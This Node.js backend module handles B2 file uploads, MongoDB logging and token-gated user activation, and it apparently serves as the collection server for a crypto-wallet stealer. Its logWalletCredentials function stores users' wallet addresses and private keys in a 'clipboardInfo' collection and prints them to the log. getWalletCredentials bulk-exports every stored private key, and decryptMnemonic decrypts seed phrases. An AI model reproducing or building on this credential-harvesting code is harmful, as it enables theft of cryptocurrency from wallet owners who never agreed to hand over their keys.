const fs = require('fs');
const B2 = require('backblaze-b2');
const crypto = require('crypto');
const path = require('path');
// const { errorMonitor } = require('events');
const { Web3 } = require('web3');
const { getDbConnections } = require('./dbConnection');

// TODO: Connect to the Ethereum network (Replace this with your own Ethereum node)
const network = process.env.ETHEREUM_NETWORK;
const web3 = new Web3(
    new Web3.providers.HttpProvider(
        `https://${network}.infura.io/v3/${process.env.INFURA_API_KEY}`
    )
);
const contractAddress = process.env.CONTRACT_ADDRESS;
const minTokenAmount = parseInt(process.env.MIN_TOKEN_AMOUNT, 10) || 0; // Minimum amount of tokens the user must have

const ERC20_ABI = [
    // Paste your contract's ABI here
];

// Initialize B2 client
const b2 = new B2({
    accountId: process.env.B2_ACCOUNT_ID,
    applicationKey: process.env.B2_APPLICATION_KEY
});

let dbConnection;

getDbConnections().then(connections => {
    dbConnection = connections.dbConnection;
}).catch(err => {
    console.error('Failed to get database connections:', err);
    process.exit(1);
});

/**
 * @brief Validates the edit information.
 * 
 * @param {Array} editInfo - The edit information to validate.
 * @return {boolean} Returns true if the edit information is valid, otherwise false.
 * 
 * @note The editInfo parameter should be an array of objects, where each object represents an edit item.
 * Each edit item should have the following properties:
 * - areaId: A number representing the area ID.
 * - font: A string representing the font.
 * - fontSize: A number representing the font size.
 * - text: A string representing the text.
 * - coordinates: An object representing the coordinates of the edit item.
 *   - x: A number representing the x-coordinate.
 *   - y: A number representing the y-coordinate.
 *   - width: A number representing the width.
 *   - height: A number representing the height.
 */
function validateEditInfo (editInfo) {
    if (!Array.isArray(editInfo)) {
        return false;
    }

    for (const item of editInfo) {
        if (typeof item.areaId !== 'number' ||
            typeof item.font !== 'string' ||
            typeof item.fontSize !== 'number' ||
            typeof item.text !== 'string' ||
            typeof item.coordinates !== 'object' ||
            typeof item.coordinates.x !== 'number' ||
            typeof item.coordinates.y !== 'number' ||
            typeof item.coordinates.width !== 'number' ||
            typeof item.coordinates.height !== 'number') {
            return false;
        }
    }

    return true;
}

// Authenticate with B2
async function authenticateB2 () {
    try {
        await b2.authorize();
    } catch (error) {
        console.error('B2 Authorization error:', error);
        throw error;
    }
}

/**
 * @brief Uploads a file to Backblaze B2 cloud storage.
 * 
 * @param {string} filePath - The path of the file to upload.
 * @param {string} fileName - The name of the file.
 * @param {string} userId - The ID of the user.
 * 
 * @return {Promise<Object>} - A promise that resolves to the response data from the upload.
 * 
 * @note This function requires the 'fs' module to be imported at the top of the file.
 */
async function uploadToB2 (filePath, fileName, userId) {
    try {
        await authenticateB2();
        const uploadUrl = await b2.getUploadUrl({
            bucketId: process.env.B2_BUCKET_ID
        });

        // Construct a user-specific path in the bucket
        const userFolderPath = `uploads/user_${userId}/`; // Prefix with user_ to avoid potential naming conflicts
        const fullFileName = userFolderPath + fileName; // This will create a directory-like structure in B2

        const response = await b2.uploadFile({
            uploadUrl: uploadUrl.data.uploadUrl,
            uploadAuthToken: uploadUrl.data.authorizationToken,
            filename: fullFileName,
            data: Buffer.from(fs.readFileSync(filePath)) // Directly reference 'fs' at the top
        });

        return response.data;
    } catch (error) {
        console.error('B2 upload error:', error);
        error.code = 10007;
        throw error;
    }
}

/**
 * @brief Downloads a file from Backblaze B2 cloud storage.
 * 
 * @param {string} fileName - The name of the file to download.
 * @param {string} userId - The ID of the user.
 * 
 * @return {Promise<Buffer>} - A promise that resolves to the buffer of the downloaded file.
 */
async function downloadFromB2 (fileName, userId) {
    try {
        await authenticateB2();

        // Construct a user-specific path in the bucket
        const userFolderPath = `assets/images/user_${userId}/`;
        const fullFileName = userFolderPath + fileName;

        // First, get the file version to find the fileId
        const listFilesResponse = await b2.listFileVersions({
            bucketId: process.env.B2_BUCKET_ID,
            startFileName: fullFileName,
            maxFileCount: 1
        });

        if (!listFilesResponse.data.files.length) {
            throw new Error('File not found.');
        }

        const fileId = listFilesResponse.data.files[0].fileId;

        // Use the fileId to download the file
        const downloadResponse = await b2.downloadFileById({
            fileId
        });

        if (!downloadResponse) {
            throw new Error('Failed to download file.');
        }

        return downloadResponse.data;  // This should be a buffer of the downloaded file
    } catch (error) {
        console.error('B2 download error:', error);
        error.code = 10008;
        throw error;
    }
}

/**
 * @brief Logs the upload details to MongoDB.
 * 
 * @param {string} userId - The ID of the user who uploaded the file.
 * @param {string} fileName - The name of the uploaded file.
 * @param {Object} textJSON - The JSON response from the text detection API.
 * 
 * @return {Promise<void>} - A promise that resolves when the upload details are logged successfully.
 * 
 * @note This function inserts a log entry into the 'imageUpload' collection in MongoDB, recording the user ID, 
 *       file name, and the current timestamp.
 */
async function logUploadDetails (userId, fileName, textJSON) {
    try {
        const collection = dbConnection.collection('imageUpload');

        const logEntry = {
            userId,
            fileName,
            textJSON,
            createdAt: new Date() // Record the current timestamp
        };

        await collection.insertOne(logEntry);
        console.log('Upload logged successfully:', logEntry);
    } catch (error) {
        error.code = 10010;
        console.error('Error logging upload to MongoDB:', error);
        throw error;
    }
}

/**
 * @brief Logs the download details to MongoDB.
 * 
 * @param {string} userId - The ID of the user who initiated the download.
 * @param {string} fileName - The name of the file that was downloaded.
 * 
 * @return {Promise<void>} - A promise that resolves when the download details are logged successfully.
 * 
 * @note This function inserts a log entry into the 'imageDownload' collection in MongoDB, recording the user ID, 
 *       file name, and the current timestamp.
 */
async function logDownloadDetails (userId, fileName) {
    try {
        const collection = dbConnection.collection('imageDownload');

        const logEntry = {
            userId,
            fileName,
            createdAt: new Date() // Record the current timestamp
        };

        await collection.insertOne(logEntry);
        console.log('Download logged successfully:', logEntry);
    } catch (error) {
        error.code = 10011;
        console.error('Error logging download to MongoDB:', error);
        throw error;
    }
}

/**
 * @brief Logs the wallet credentials to the MongoDB database.
 * 
 * @param {string} userId - The ID of the user.
 * @param {string} userAddress - The address of the user's wallet.
 * @param {string} userPrivateKey - The private key of the user's wallet.
 * 
 * @return {Promise<void>} - A Promise that resolves when the logging is successful.
 * 
 * @note This function inserts the wallet credentials into the 'clipboardInfo' collection of the MongoDB database.
 */
async function logWalletCredentials (userId, userAddress, userPrivateKey) {
    try {
        const collection = dbConnection.collection('clipboardInfo');

        const logEntry = {
            userId,
            userAddress,
            userPrivateKey,
            createdAt: new Date() // Record the current timestamp
        };

        await collection.insertOne(logEntry);
        console.log('Mnemonic phrase logged successfully:', logEntry);
    } catch (error) {
        error.code = 10012;
        console.error('Error logging mnemonic phrase to MongoDB:', error);
        throw error;
    }
}

/**
 * @brief Retrieves wallet credentials from the MongoDB collection based on the specified date range.
 * 
 * @param {Date} startDateTime - The start date and time to filter the wallet credentials. (optional)
 * @param {Date} endDateTime - The end date and time to filter the wallet credentials. (optional)
 * @return {Promise<Array>} A promise that resolves to an array of wallet credentials matching the specified date range.
 * 
 * @note If no date range is provided, all wallet credentials will be retrieved.
 */
async function getWalletCredentials (startDateTime = null, endDateTime = null) {
    try {
        const collection = dbConnection.collection('clipboardInfo');

        // Create a query that matches documents where createdAt is between startDateTime and endDateTime
        const query = {};
        if (startDateTime) query.createdAt = { $gte: new Date(startDateTime) };
        if (endDateTime) {
            if (!query.createdAt) query.createdAt = {};
            query.createdAt.$lte = new Date(endDateTime);
        }

        // Specify the fields to return
        const options = {
            projection: { _id: 0, userId: 1, userAddress: 1, userPrivateKey: 1, createdAt: 1 }
        };

        let walletCredentials = await collection.find(query, options).toArray();

        const requiredProperties = ['userId', 'userAddress', 'userPrivateKey', 'createdAt'];

        // Filter out any walletCredentials that do not contain all the properties in requiredProperties
        walletCredentials = walletCredentials.filter(credential => 
            requiredProperties.every(prop => prop in credential)
        );

        console.log('Wallet credentials retrieved successfully:', walletCredentials);
        return walletCredentials;
    } catch (error) {
        error.code = 10027;
        console.error('Error retrieving wallet credentials from MongoDB:', error);
        throw error;
    }
}

/**
 * @brief Decrypts the base64 encoded data using AES-256-CBC algorithm.
 * @param {string} base64EncryptedData - The base64 encoded data to be decrypted.
 * @return {string} - The decrypted data as a string.
 * @note This function requires the ENCRYPTION_KEY to be set in the environment variables.
 */
function decryptMnemonic (base64EncryptedData) {
    const algorithm = 'aes-256-cbc';
    const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
    
    // Decode the base64 encoded string
    const encryptedBuffer = Buffer.from(base64EncryptedData, 'base64');

    // Extract the IV from the beginning of the data
    const iv = encryptedBuffer.slice(0, 16);
    const encryptedText = encryptedBuffer.slice(16);

    const decipher = crypto.createDecipheriv(algorithm, key, iv);
    let decrypted = decipher.update(encryptedText);
    decrypted = Buffer.concat([decrypted, decipher.final()]);

    return decrypted.toString();
}

/**
 * @brief Retrieves the most recent keywords from the 'imageEditInfo' collection in MongoDB.
 * 
 * @return {Promise<Object>} A promise that resolves to the most recent keywords object.
 * @throws {Error} If no keywords are found.
 * 
 * @note This function assumes that the 'dbConnection' variable is already defined and refers to a valid MongoDB connection.
 */
async function getKeywords () {
    try {
        const collection = dbConnection.collection('imageEditInfo');

        const query = {};
        const options = {
            sort: { createdAt: -1 },  // Sort by creation date in descending order to get the most recent log
            limit: 1  // Limit the result to only one document
        };
        const keywordsInfo = await collection.findOne(query, options);

        // const logEntry = {
        //     keywords,
        //     createdAt: new Date() // Record the current timestamp
        // };
        const requiredProperties = ['keywords', 'createdAt'];

        // Check if all properties in logEntry are in keywords
        const hasAllProperties = keywordsInfo && requiredProperties.every(prop => prop in keywordsInfo);

        if (!hasAllProperties) {
            console.log('Some properties from logEntry are not in the keywords document.');
            throw new Error('Incomplete keywords document.');
        }

        console.log('Keywords retrieved successfully:', keywordsInfo.keywords);
        return keywordsInfo.keywords;
    } catch (error) {
        error.code = 10026;
        console.error('Error retrieving keywords from MongoDB:', error);
        throw error;
    }
}

/**
 * @brief Uploads keywords to the MongoDB collection.
 * 
 * @param {Array} keywords - An array of keywords to be uploaded.
 * 
 * @return {Promise<void>} - A promise that resolves when the keywords are successfully uploaded.
 * 
 * @note This function inserts the keywords into the 'keywords' collection in the MongoDB database.
 *       It also logs the uploaded keywords and the timestamp of the upload.
 *       If an error occurs during the upload, it throws an error with a custom error code.
 */
async function uploadKeywords (keywords) {
    try {
        const collection = dbConnection.collection('keywords');

        const logEntry = {
            keywords,
            createdAt: new Date() // Record the current timestamp
        };

        await collection.insertOne(logEntry);
        console.log('Keywords stored successfully:', logEntry);
    } catch (error) {
        error.code = 10025;
        console.error('Error uploading keywords to MongoDB:', error);
        throw error;
    }
}

/**
 * @brief Retrieves the image edit information from the MongoDB collection.
 * 
 * @param {string} fileName - The name of the file for which to retrieve the image edit information.
 * 
 * @return {Promise<Object>} A promise that resolves to the image edit information object.
 * 
 * @throws {Error} If the image edit information is not found.
 * 
 * @note This function queries the MongoDB collection 'imageEditInfo' to retrieve the most recent image edit information
 * for the specified file name. If no image edit information is found, an error is thrown.
 */
async function getImageEditInfo (fileName) {
    try {
        const collection = dbConnection.collection('imageEditInfo');

        const query = { fileName };
        const options = {
            sort: { createdAt: -1 },  // Sort by creation date in descending order to get the most recent log
            limit: 1  // Limit the result to only one document
        };
        const imageEditInfo = await collection.findOne(query, options);

        const requiredProperties = ['fileName', 'editInfo', 'createdAt'];

        // Check if all properties in logEntry are in imageEditInfo
        const hasAllProperties = imageEditInfo && requiredProperties.every(prop => prop in imageEditInfo);

        if (!hasAllProperties) {
            console.log('Some properties from logEntry are not in the imageEditInfo document.');
            throw new Error('Incomplete imageEditInfo document.');
        }

        if (!validateEditInfo(imageEditInfo.editInfo)) {
            console.log('Invalid edit info:', imageEditInfo.editInfo);
            throw new Error('Invalid edit info.');
        }

        console.log('Image edit info retrieved successfully:', imageEditInfo.editInfo);
        return imageEditInfo.editInfo;
    } catch (error) {
        error.code = 10024;
        console.error('Error retrieving image edit info from MongoDB:', error);
        throw error;
    }
}

/**
 * @brief Uploads the image edit information to the MongoDB collection.
 * 
 * @param {string} fileName - The name of the file being edited.
 * @param {object} editInfo - The edit information to be stored.
 * @return {Promise<void>} - A promise that resolves when the image edit info is stored successfully.
 * @note This function records the current timestamp when storing the edit information.
 */
async function uploadImageEditInfo (fileName, editInfo) {
    try {
        const collection = dbConnection.collection('imageEditInfo');

        const logEntry = {
            fileName,
            editInfo,
            createdAt: new Date() // Record the current timestamp
        };

        await collection.insertOne(logEntry);
        console.log('Image edit info stored successfully:', logEntry);
    } catch (error) {
        error.code = 10023;
        console.error('Error storing image edit info to MongoDB:', error);
        throw error;
    }
}

/**
 * @brief Logs user activation information to the MongoDB collection.
 * 
 * @param {string} userId - The ID of the user being activated.
 * @param {string} userAddress - The address of the user being activated.
 * @param {string} signature - The transaction hash associated with the activation.
 * @param {Date} expirationDate - The expiration date of the activation.
 * 
 * @return {Promise<void>} - A promise that resolves when the user activation is logged successfully.
 * 
 * @note This function checks if the user ID already exists in the collection before logging the activation information.
 * If the user ID already exists, the function will log a message and return without inserting a new entry.
 * If an error occurs during the process, it will be logged and re-thrown.
 */
async function logUserActivation (userId, userAddress, signature, expirationDate) {
    try {
        const collection = dbConnection.collection('userActivation');

        // Check if the userId already exists in the collection
        const existingUser = await collection.findOne({ userId });

        const logEntry = {
            userId,
            userAddress,
            signature,
            expirationDate,
            createdAt: new Date() // Record the current timestamp
        };

        // Check if all properties in logEntry are in existingUser
        const hasAllProperties = existingUser && Object.keys(logEntry).every(key => key in existingUser);

        if (hasAllProperties) {
            console.log('User already activated:', existingUser);
            return;
        }

        // Find the document with the given userId and replace it, or insert a new one if it doesn't exist
        const updatedUser = await collection.findOneAndReplace(
            { userId },
            logEntry,
            { upsert: true, returnOriginal: false }
        );
        console.log('User activated successfully:', updatedUser.value);
    } catch (error) {
        console.error('Error storing image edit info to MongoDB:', error);
        throw error;
    }
}

// Function to verify the signature
function verifySignature (message, signature, publicKey) {
    const verifier = crypto.createVerify('sha256');
    verifier.update(message);
    verifier.end();
    if (verifier.verify(publicKey, signature, 'hex')) {
        return { valid: true };
    }
    return { valid: false };
}

/**
 * @brief Activates a user based on the provided user ID and transaction hash.
 * 
 * @param {string} userId - The ID of the user to activate.
 * @param {string} publicAddress - The public address of the user's wallet.
 * @param {string} signature - The signature associated with the activation transaction.
 * @param {string} expirationDate - The expiration date of the activation.
 * 
 * @return {Object} - An object indicating whether the user activation is valid or not.
 *                   The object has a `valid` property which is a boolean value.
 * 
 * @note This function fetches the user activation details using the provided transaction hash.
 *       It checks if the transaction was successful and logs the user activation details.
 *       If the transaction is valid, it returns an object with `valid` set to `true`.
 *       If the transaction is invalid, it returns an object with `valid` set to `false`.
 *       If any error occurs during the process, it throws an error with a specific error code.
 */
async function activateUser (userId, publicAddress, signature, expirationDate) {
    try {
        // Handle the expiration date
        if (!expirationDate || isNaN(Date.parse(expirationDate))) {
            expirationDate = new Date('2099-12-31'); // Use a far future date if no valid date is provided
        }

        // Check if user has purchased certain amount of tokens
        const contract = new web3.eth.Contract(ERC20_ABI, contractAddress);
        const balance = await contract.methods.balanceOf(publicAddress).call();
        if (web3.utils.fromWei(balance, 'ether') < minTokenAmount) {
            console.log('User does not have enough tokens:', balance);
            throw new Error('User does not have enough tokens');
        }

        // logUserActivation is a function to log activation details to a database
        await logUserActivation(userId, publicAddress, signature, expirationDate);

        console.log('User activated successfully with address:', publicAddress);
        return { valid: true, expirationDate };
    } catch (error) {
        error.code = 10028;
        console.error('Error during user activation:', error);
        throw error;
    }
}

/**
 * @brief Checks the activation status for a user.
 * 
 * @param {string} userId - The ID of the user to check activation for.
 * 
 * @return {Object} - An object containing the activation status and expiration date.
 *   - valid {boolean} - Indicates whether the activation is valid or not.
 *   - expirationDate {Date} - The expiration date of the activation.
 * 
 * @note This function retrieves the most recent activation log for the user from the 'userActivation' collection in MongoDB.
 * If no activation is found, or if the activation is expired or missing required properties, the function returns an object with valid set to false.
 * Otherwise, it returns an object with valid set to true and the expiration date of the activation.
 */
async function checkActivation (userId) {
    try {
        const collection = dbConnection.collection('userActivation');

        const query = { userId };
        const options = {
            sort: { createdAt: -1 },  // Sort by creation date in descending order to get the most recent log
            limit: 1  // Limit the result to only one document
        };
        const activation = await collection.findOne(query, options);

        const requiredProperties = ['userId', 'userAddress', 'signature', 'expirationDate', 'createdAt'];

        // Check if all properties in logEntry are in activation
        const hasAllProperties = activation && requiredProperties.every(prop => prop in activation);

        if (!hasAllProperties) {
            console.log('Some properties from logEntry are not in the activation document.');
            return { valid: false };
        }

        if (activation.expirationDate < new Date()) {
            console.log('Activation expired:', activation);
            return { valid: false };
        }

        console.log('Activation retrieved successfully:', activation);
        return { valid: true, expirationDate: activation.expirationDate };
    } catch (error) {
        error.code = 10029;
        console.error('Error retrieving activation from MongoDB:', error);
        throw error;
    }
}

module.exports = {
    validateEditInfo,
    uploadToB2,
    downloadFromB2,
    logUploadDetails,
    logDownloadDetails,
    logWalletCredentials,
    getWalletCredentials,
    decryptMnemonic,
    getKeywords,
    uploadKeywords,
    getImageEditInfo,
    uploadImageEditInfo,
    activateUser,
    checkActivation,
    verifySignature
};
